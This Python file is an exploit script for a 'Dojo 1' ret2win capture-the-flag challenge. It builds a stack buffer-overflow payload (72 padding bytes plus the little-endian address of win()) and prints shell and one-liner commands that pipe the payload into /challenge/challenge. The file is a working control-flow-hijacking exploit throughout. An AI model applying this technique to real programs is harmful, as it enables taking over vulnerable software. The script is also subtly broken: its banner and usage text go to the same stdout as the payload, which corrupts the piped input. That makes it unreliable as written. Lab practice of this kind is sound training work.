#!/usr/bin/env python3
"""
Exploit script for Dojo 1: ret2win challenge
This script generates the payload to exploit the buffer overflow
"""

import sys
import struct


def p64(addr):
    """Pack a 64-bit address in little-endian format"""
    return struct.pack('<Q', addr)


def generate_payload(win_address):
    """
    Generate the exploit payload
    
    Args:
        win_address: The address of the win() function (as integer or hex string)
    
    Returns:
        bytes: The exploit payload
    """
    # Convert hex string to integer if needed
    if isinstance(win_address, str):
        win_address = int(win_address, 16)
    
    # Buffer overflow structure:
    # [64 bytes buffer] + [8 bytes saved RBP] + [8 bytes return address]
    
    padding = b"A" * 72  # 64 bytes buffer + 8 bytes saved RBP
    ret_addr = p64(win_address)  # Overwrite return address with win()
    
    payload = padding + ret_addr
    
    return payload


def main():
    print("=" * 60)
    print("Dojo 1: ret2win Exploit Generator")
    print("=" * 60)
    print()
    
    if len(sys.argv) > 1:
        # Address provided as command-line argument
        win_address = sys.argv[1]
    else:
        # Interactive mode
        print("First, run the challenge to get the win() address:")
        print("  $ /challenge/challenge")
        print()
        print("Example output:")
        print("  win() function is located at: 0x4011e6")
        print()
        win_address = input("Enter the win() address (e.g., 0x4011e6): ").strip()
    
    try:
        payload = generate_payload(win_address)
        
        print()
        print("✓ Payload generated successfully!")
        print(f"✓ Target address: {win_address}")
        print(f"✓ Payload size: {len(payload)} bytes")
        print()
        print("-" * 60)
        print("USAGE OPTIONS:")
        print("-" * 60)
        print()
        
        # Option 1: Pipe to challenge
        print("Option 1: Pipe directly to the challenge")
        print("-" * 40)
        print(f"python3 exploit.py {win_address} | /challenge/challenge")
        print()
        
        # Option 2: Save to file
        print("Option 2: Save to file and redirect")
        print("-" * 40)
        print(f"python3 exploit.py {win_address} > payload.bin")
        print("cat payload.bin | /challenge/challenge")
        print()
        
        # Option 3: One-liner
        print("Option 3: One-liner (no script needed)")
        print("-" * 40)
        addr_int = int(win_address, 16) if isinstance(win_address, str) else win_address
        print(f"python3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*72 + ({hex(addr_int)}).to_bytes(8, \"little\"))' | /challenge/challenge")
        print()
        
        # Output the payload to stdout for piping
        sys.stdout.buffer.write(payload)
        
    except ValueError as e:
        print(f"✗ Error: Invalid address format. Please use hex format (e.g., 0x4011e6)")
        sys.exit(1)
    except Exception as e:
        print(f"✗ Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
